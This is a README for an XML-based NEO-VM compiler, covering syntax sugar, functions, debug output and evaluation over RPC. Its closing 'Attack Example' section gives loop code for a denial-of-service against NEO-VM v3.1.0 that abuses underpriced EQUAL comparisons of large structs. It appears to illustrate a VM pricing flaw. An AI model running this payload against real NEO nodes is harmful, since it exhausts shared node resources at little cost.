# NEO COMPILER

Yet another NEO compiler.

Based on XML parser, this compiler could translate original NEO opcode into bytecode. Plus, it provides some syntax suger for esay usage. What's more, we provide some high level features such as conditions, loops as well as functions.

* *high performance* as raw opcode
* *automatic address calculation* for loops and conditions opcode
* *high level features* such as function

We assume you know the neo-vm's composition and principles. If not, we recommend you read [docs](https://docs.neo.org/docs/en-us/basic/neovm.html) first.

## Basic Usage

As a convention, let's write a `Hello, world!` first.

```xml
<lazy xmlns:a="Assembly">
    <!-- This program left a **ByteString** "Hello, world!" on the **ResultStack**. -->
    <a:string val="Hello, world!" />
</lazy>
```

* the root node must be **lazy**
* attribute in the root node `xmlns:a="Assembly"` defines the namesapce **a**, whose URI is **Assembly**
* there are two URIs for now (**Assembly** and **Basic**) which contains different sugers and features
* the node **string** under **Assembly** provides a syntax suger for easily putting a string literal on the neo-vm's stack
* comments is supportted by XML itself

Let's run the compiler and see the result.

```sh
> cat examples/1.helloworld.xml | dotnet run . | base64

DA1IZWxsbywgd29ybGQh
```

* the compiler takes standard input as source code and print the bytecode into standard output in binary format
* as NEO use the base64 format everywhere, we'd better convert it into base64 for next step

## Debug

There exists an envirment variable called `DEBUG`. After setting that, the compiler will output the opcode before translating it into bytecode.

```sh
> DEBUG=1 cat examples/1.helloworld.xml | dotnet run . | base64

<lazy xmlns:a="Assembly">
  <pushdata1 oprand="0d48656c6c6f2c20776f726c6421" />
</lazy>
DA1IZWxsbywgd29ybGQh
```

As you can see, the debug output will not contain any node under the two namespaces. Only the opcode supportted by neo-vm directly will show here.

Of cause, this xml document is also a correct code version for printing `Hello, world!` while it is hard for human reading.

## Evaluation

```sh
> curl http://seed1.neo.org:20332 -d '{ "jsonrpc": "2.0", "id": 1, "method": "invokescript", "params": ["DA1IZWxsbywgd29ybGQh"] }'| json_pp

{
   "id" : 1,
   "jsonrpc" : "2.0",
   "result" : {
      "exception" : null,
      "gasconsumed" : "24",
      "script" : "DA1IZWxsbywgd29ybGQh",
      "stack" : [
         {
            "type" : "ByteString",
            "value" : "SGVsbG8sIHdvcmxkIQ=="
         }
      ],
      "state" : "HALT"
   }
}
```

We can execute the bytecode by sending it to neo RPC node. More docs can be found [here](https://docs.neo.org/docs/en-us/reference/rpc/latest-version/api/invokescript.html).

```sh
> echo 'SGVsbG8sIHdvcmxkIQ==' | base64 -d

Hello, world!
```

Then parse the result on the result stack. We'll get the output.

## Node Usage

There are four types of nodes for now: Lazy, Raw opcode, syntax sugers in namespace `Assembly` and features in namesapce `Basic`.

### lazy node

`<lazy />` can be used anywhere, it has no actual effect on the bytecode. `<lazy>` and `</lazy>` pair can be used for code formatting. Its usage is the same as `{` and `}` in C-like programming languages. The root node must be lazy node.

### opcode node

A full list of opcode can be found [here](https://docs.neo.org/docs/en-us/reference/neo_vm.html).

The opcode node contains only one optional attribute called **oprand**. Every node can **not** contain a body.

As list in the document, some opcode do not need any parameter, directly use them without attribute will be OK. For example, `<dup />` will duplicate the peek item on the evluation stack.

Some opcode need an oprand standing for specific meanings, then the node must contain a attribute will its value in *little-endian hex encoded format*. The format is used [here](https://github.com/neo-project/neo-vm/blob/5d6b5fed6b3e140d0a2b9b6a3cfc4720651d7e50/src/neo-vm/Instruction.cs#L79) in neo-vm's code.

Take the `pushdata1` as example.

> PUSHDATA1, PUSHDATA2, PUSHDATA4: The next n bytes contain the number of bytes to be pushed onto the stack, where n is specified by 1|2|4.

This means the next 1 byte oprand is used for string data length x. The next x bytes stands for the data.

Therefore, the first byte of the oprand should be 13 (0x0d) for `Hello, world!`. The following bytes should be hex encoded string. One solution is `echo -n Hello, world! | od -A n -t x1`. Therefore, the code should be `<pushdata1 oprand="0d48656c6c6f2c20776f726c6421" />` in above code.

### assembly node

All syntax sugers are showed below. Those attributes who have default values will be list in `${attri}=${default}` format in the second column. Those nodes who can have a body will be showed in `<${node}><lazy/></${node}>` format in the third column. The `<lazy/>` in the third column could be replaced with any other node[s].


node  | attributes | example          | description
----- | ---------- | ---------------  | -------
int   | val        | `<a:int val="1" />`  | put an **Integer** literal onto the evaluation stack
string| val        | `<a:string val="Hello, world!" />` | put an **ByteString** literal onto the evaluation stack
bytes | val        | `<a:bytes val="48656c6c6f" />`  | put an **Buffer** literal onto the evaluation stack
bool  | val        | `<a:bool val="true" />`  | put an **Boolean** literal onto the evaluation stack
 | | |
dowhile | cond=if | `<a:dowhile><lazy/></a:dowhile>` | this constructs a dowhile loop in its body, in the end of every loop, it will pop a value on the stack, if it's true, the loop will continue
while | cond=if | `<a:while cond="eq"><lazy/></a:while>` | this constructs a while loop in its body, in the start of every loop, it will pop two values on the stack, if they're equal, the loop will continue
if | - | `<a:if><lazy/></a:if>` | pop a value on the stack, if it's true, the body will be executed, vice versa
else | - | `<a:else><lazy/></a:else>` | pop a value on the stack, if it's false, the body will be executed, vice versa
 | | |
syscall | name | `<a:syscall name= "System.Storage.Get" />` | this will construct a system call, the name can be chosen from [here](https://docs.neo.org/docs/en-us/reference/scapi/interop.html)
contractcall | flag=All,method,hash | `<a:contractcall hash="${STDLIB'S HASH}" method="jsonSerialize" />` | a convenience format for syscall `System.Contract.Call`, the example calls the stdlib's json serialize method, the hash hould be 0xacce6fd80d44e1796aa0c2c625e9e4e0ce39efc0
goto   | - | - | internal use only
invoke   | - | - | internal use only
removable   | - | - | internal use only

### basic node

There are some features provided by **Basic** nodes.

* variable definition and usage
* function definition and usage

node  | attributes | example          | description
----- | ---------- | ---------------  | -------
literal   | datatype=[int|bool|string|bytes],val  | `<b:literal datatype="string" val="Hello, world!/>`  | put a literal onto the stack
if   | name,type=[var|arg] | `<b:if type="arg" name="id"><lazy/></b:if>` | if the varable can be converted to true, the body will be executed, vice verse
else   | name,type=[var|arg] | `<b:else type="arg" name="id"><lazy/></b:else>`  | if the varable can be converted to false, the body will be executed, vice verse
dowhile   | name,type=[var|arg] | `<b:dowhile  type="arg" name="id"><lazy/></b:dowhile>`  | if the varable can be converted to true, the body will be looped, the body will be exected at least once
while   | name,type=[var|arg] | `<b:while   type="arg" name="id"><lazy/></b:while>`  | if the varable can be converted to true, the body will be looped
 | | |
func   | name,inline | `<b:func name="main"><lazy/></b:func>`  | defines a function, vars stands for the local variable number while args stands for the argument number; do not leave any new data on the evaluation stack after `func`'s execution, return the data using `return` node; don't use inline, as its behavier is complicated
arg   | name        | `<b:arg name="id"/>`  | must be a `func` node's child, this stands for a argument, better placed in the start of a func's body
var   | name        | `<b:var name="temp" />`  | must be a `func` node's child, this stands for a local variable, better placed in the start of a func's body
load   | name,type=[var|arg] | `<b:load type="arg" name="id" />`  | load the parent node funtion's argument or local variable
save   | name,type=[var|arg] | `<b:save type="arg" name="id"/>`  | pop a value on the stack and save it into parent node funtion's argument or local variable
return   | - | `<b:return />`  | return from a function, the returned value should be `load` in `return`'s body
exec   | name | `<b:exec name="main"/>`  | call a function, you can parse the argument in `exec`'s body using `load`, and accept the returned value using `save` in `exec`'s body
entry   | name | `<b:entry name="main" />`  | `entry` must be the first child of the root node, the entry function must contains no argument
get   | - | - | internal use only
set   | - | - | internal use only

## attribute keywords

Other than these keywords, any identifiers can be used in any node, they'll have no meaning in compile time.

### kept keywords

below are kept keywords, internal use only

* `id`: mark a location, used for address calculation
* `target`: mark a destination, used for address calculation
* `del`: indicate the node can be removed
* `args`: used for `func`, indicate its arguments number
* `vars`: used for `func`, indicate its local variables number

### common attributes

below are some common attributes can be found in many nodes

* `oprand`: used in opcode nodes, have different meaning under differnet nodes, refer to docs [here](https://docs.neo.org/docs/en-us/reference/neo_vm.html)
* `cond`: its value can be chosen from `if`, `ifnot`, `eq`, `ne`, `gt`, `ge`, `lt`, `le`. **Note!!! Note!!! Note!!!** Those who contains `cond` will pop the value from the stack, please `<dup/>` the value if you want to use it/them again on the stack.
* `val`: used in literal nodes, indicate the value
* `name`: used as functions, varaibles or some other things' identifier
* `type`: when used in functions, its value can be chosen from `arg`, `var`, `literal`; when used in literal node, its value can be `int`, `string`, `bytes`, `bool`

## Advanced Usage

As shown in [examples](./examples/) folder, a advanced usage of `Basic` nodes is shown in the third example.

```xml
<lazy xmlns:b="Basic">
    <b:entry name="main" />
    <!-- ... some functions here ... -->
</lazy>
```

* The first child in root node is `entry`, which indicate the bytecode's entry point. The entry function must have no argument.

Actually, if the first function is the entry, this line can be omitted.

```xml
<b:func name="main">
   <b:var name="obj" />
   <b:var name="result" />

   <b:literal type="string" val="world" />
   <b:save name="obj" />

   <b:exec name="do">
      <b:literal type="string" val="Hello" />
      <b:load type="var" name="obj" />
      <b:save type="var" name="result" />
   </b:exec>

   <b:load name="result" />
   <b:return />
</b:func>
```

The main function contains two variables, the first is called "obj" and the second is called "result".

This function initialize the "obj" by a string literal which value is "world.

Then, `main` call the function `do` with two parameters and accept one return value. The first argument is "Hello" literal and the second literal is variable "obj". `main` accept the returned value in variable "result".

At last, `main` read the "result" variable to the stack.

* Every function must have at least one `return` node, the `return` must be exected as the last instruction.

The `do` function in the example is easy for understanding and will not be shown here, it accept two arguments and return one result using `return` node.

* A function should now leave any new items on the stack unless you know what you're doing.

## Attack Example

The NEO-VM v3.1.0 have an Opcode called `equal`, it's very cheap while can occupy lots of cpu time when using `Struct` with lots of `ByteString`.

The max comparable size of ByteString is 65535 which can be found [here](https://github.com/neo-project/neo-vm/blob/b18e040d2115ed2ea3c9a60ae8722a7865b38927/src/neo-vm/Types/ByteString.cs#L53).

The max StackItems on the stack and struct is 2048 which can be found [here](https://github.com/neo-project/neo-vm/blob/v3.1.0/src/neo-vm/ExecutionEngineLimits.cs#L34).

Therefore, we can construct two structs where each struct contains 1000 large string whose length is 65535.

```xml
<a:int val="10000" />
<b:save type="var" name="tmp" />
<b:dowhile type="var" name="tmp">
   <b:load type="var" name="s1" />
   <b:load type="var" name="s2" />
   <equal />
   <clear />
   <b:load type="var" name="tmp" />
   <dec />
   <b:save type="var" name="tmp" />
</b:dowhile>
```

In the fourth example, the main function's core is the loop, it tests equality in every loop. Therefore, the time consumed will be `loop_times * 65535 * 10000`. But the GAS consumed is a little. The DDOS attack complete.
